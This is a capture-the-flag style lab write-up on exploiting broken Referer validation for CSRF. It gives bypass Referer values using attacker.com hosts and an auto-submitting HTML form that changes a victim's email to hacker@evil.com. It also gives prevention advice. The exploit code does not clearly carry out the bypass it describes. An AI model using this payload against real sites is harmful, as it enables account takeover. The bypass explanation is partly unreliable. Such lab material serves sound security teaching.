# Lab: CSRF with broken Referer validation

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)

## 🎯 Objective
Exploit broken Referer header validation to perform a CSRF attack.

## 📖 Description
The application attempts to validate the `Referer` header to prevent CSRF. However, the validation logic is flawed (e.g. it only checks if the Referer contains the target domain as a substring, or accepts partial matches, or allows certain spoofed values).

## 🔍 Vulnerability Analysis

- **Defense**: Referer header check.
- **Weakness**: Broken validation logic (common examples: substring check, missing strict URL validation, or allowing null/empty values in some cases).
- **Bypass**: Craft a Referer that passes the weak check (e.g. `https://attacker.com.victim.com` or using a subdomain).

## 🛠️ How to Solve (Step by Step)

1. Capture a legitimate request and see how the Referer is validated.
2. Test different Referer values in Burp Repeater until you find one that bypasses the check.
3. Common bypasses:
   - Subdomain: `https://victim.com.attacker.com`
   - Path manipulation
   - Using a trusted subdomain if available

## 💥 Exploit Code (with custom Referer)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - Broken Referer</title>
    <!-- Some browsers allow controlling Referer via meta -->
    <meta name="referrer" content="origin">
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery
Upload to Exploit Server → Deliver to victim.
⚡ Impact
Weak Referer validation can be easily bypassed, allowing full CSRF attacks.
🛡️ Prevention

Avoid using Referer header as the primary CSRF defense.
If used, implement strict validation (exact domain match, no subdomains unless trusted).
Prefer CSRF tokens + SameSite cookies.

🔬 Key Learning Points

String-based header validation is often bypassable.
Referer can be spoofed or manipulated in various ways.
Header-based defenses are generally weaker than token-based ones.
